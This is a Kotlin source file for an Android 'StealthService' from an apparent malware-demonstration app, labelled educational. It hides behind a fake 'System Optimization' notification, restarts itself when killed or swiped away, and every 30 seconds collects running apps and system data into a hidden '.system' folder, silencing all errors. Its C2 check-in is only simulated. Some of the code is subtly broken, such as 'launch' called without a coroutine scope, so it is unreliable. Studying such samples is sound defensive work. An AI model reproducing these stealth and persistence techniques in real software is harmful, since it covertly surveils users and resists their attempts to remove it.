package com.securitydemo.malware.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.securitydemo.malware.R
import com.securitydemo.malware.activities.MainActivity
import com.securitydemo.malware.utils.SystemInfoCollector
import kotlinx.coroutines.*
import java.io.File

/**
 * SECURITY DEMO: Stealth Service
 * 
 * This service demonstrates how malware operates persistently in the background:
 * - Runs as foreground service to avoid being killed
 * - Hides malicious activities behind legitimate-looking notifications
 * - Performs data collection and exfiltration
 * - Maintains persistence through various Android restrictions
 * - Periodically communicates with C2 servers
 * 
 * EDUCATIONAL PURPOSE ONLY
 */
class StealthService : Service() {

    companion object {
        private const val NOTIFICATION_ID = 1337
        private const val CHANNEL_ID = "system_updates"
        private const val STEALTH_INTERVAL = 30000L // 30 seconds
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var systemInfoCollector: SystemInfoCollector
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        systemInfoCollector = SystemInfoCollector(this)
        createNotificationChannel()
        startStealthOperations()
        
        // Initialize persistence manager for this service
        initializePersistenceManager()
    }
    
    private fun initializePersistenceManager() {
        try {
            val persistenceManager = PersistenceManager(this)
            persistenceManager.initializePersistence()
        } catch (e: Exception) {
            // Silently fail
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createStealthNotification())
        
        // Ensure service restarts if killed by system
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Updates", // Appears legitimate to user
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background system maintenance"
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
                setSound(null, null)
            }

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createStealthNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Optimization")
            .setContentText("Optimizing device performance...")
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setShowWhen(false)
            .build()
    }

    private fun startStealthOperations() {
        serviceScope.launch {
            while (isActive) {
                try {
                    performStealthActivities()
                    delay(STEALTH_INTERVAL)
                } catch (e: Exception) {
                    // Silently handle errors - typical malware behavior
                }
            }
        }
    }

    private suspend fun performStealthActivities() {
        // Simulate various malicious activities
        launch { collectSystemInformation() }
        launch { monitorUserActivity() }
        launch { checkForC2Communication() }
        launch { maintainPersistence() }
        launch { hideEvidence() }
    }

    private suspend fun collectSystemInformation() {
        try {
            val systemInfo = systemInfoCollector.collectAllInformation()
            saveDataSecretly("system_info.json", systemInfo)
            
            // Update notification occasionally to appear active
            if (System.currentTimeMillis() % 300000 < STEALTH_INTERVAL) { // Every 5 minutes
                updateNotification("Analyzing system performance...")
            }
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private suspend fun monitorUserActivity() {
        try {
            // Simulate monitoring user interactions
            val activityInfo = mapOf(
                "timestamp" to System.currentTimeMillis(),
                "screen_state" to "active",
                "running_apps" to systemInfoCollector.getRunningApps(),
                "battery_level" to systemInfoCollector.getBatteryLevel()
            )
            
            saveDataSecretly("activity_log.json", activityInfo.toString())
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private suspend fun checkForC2Communication() {
        try {
            // Simulate periodic check-in with command & control server
            // In real malware, this would send device info and receive commands
            
            updateNotification("Checking for updates...")
            delay(2000) // Simulate network operation
            
            // Log the attempt
            val c2Log = mapOf(
                "timestamp" to System.currentTimeMillis(),
                "status" to "attempted",
                "server" to "192.168.1.100:8080" // Demo server
            )
            
            saveDataSecretly("c2_log.json", c2Log.toString())
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private suspend fun maintainPersistence() {
        try {
            // Ensure the service stays running and restarts automatically
            
            // Check if boot receiver is still registered
            val bootReceiverActive = true // Simulate check
            
            // Verify foreground service is active
            val serviceActive = true // We're running, so true
            
            val persistenceStatus = mapOf(
                "boot_receiver_active" to bootReceiverActive,
                "service_active" to serviceActive,
                "last_check" to System.currentTimeMillis()
            )
            
            saveDataSecretly("persistence_check.json", persistenceStatus.toString())
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private suspend fun hideEvidence() {
        try {
            // Periodically clean up obvious traces
            val cacheDir = File(cacheDir, "system_cache")
            if (!cacheDir.exists()) {
                cacheDir.mkdirs()
            }
            
            // Move sensitive files to hidden location
            val hiddenDir = File(filesDir, ".system")
            if (!hiddenDir.exists()) {
                hiddenDir.mkdirs()
            }
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private fun saveDataSecretly(filename: String, data: String) {
        try {
            val hiddenDir = File(filesDir, ".system")
            if (!hiddenDir.exists()) {
                hiddenDir.mkdirs()
            }
            
            val file = File(hiddenDir, filename)
            file.writeText(data)
        } catch (e: Exception) {
            // Silently fail - typical malware behavior
        }
    }

    private fun updateNotification(newText: String) {
        handler.post {
            val updatedNotification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Optimization")
                .setContentText(newText)
                .setSmallIcon(R.drawable.ic_notification)
                .setOngoing(true)
                .setSilent(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setShowWhen(false)
                .build()

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.notify(NOTIFICATION_ID, updatedNotification)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        
        // Malware often tries to restart itself when killed
        handler.postDelayed({
            try {
                val restartIntent = Intent(this, StealthService::class.java)
                startForegroundService(restartIntent)
            } catch (e: Exception) {
                // Silently fail
            }
        }, 5000) // Restart after 5 seconds
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        
        // Ensure service continues running even when app is removed from recents
        val restartIntent = Intent(applicationContext, StealthService::class.java)
        startForegroundService(restartIntent)
    }

    /**
     * Demonstrates how malware can gather information about its stealth operations
     */
    fun getStealthReport(): String {
        val report = StringBuilder()
        report.append("=== STEALTH SERVICE REPORT ===\n\n")
        
        try {
            val hiddenDir = File(filesDir, ".system")
            if (hiddenDir.exists()) {
                report.append("Hidden files created:\n")
                hiddenDir.listFiles()?.forEach { file ->
                    report.append("• ${file.name} (${file.length()} bytes)\n")
                }
            }
            
            report.append("\nService Status:\n")
            report.append("• Running in background: ✓\n")
            report.append("• Foreground service: ✓\n")
            report.append("• Persistent notification: ✓\n")
            report.append("• Auto-restart enabled: ✓\n")
            
        } catch (e: Exception) {
            report.append("Error generating report: ${e.message}\n")
        }
        
        return report.toString()
    }
}
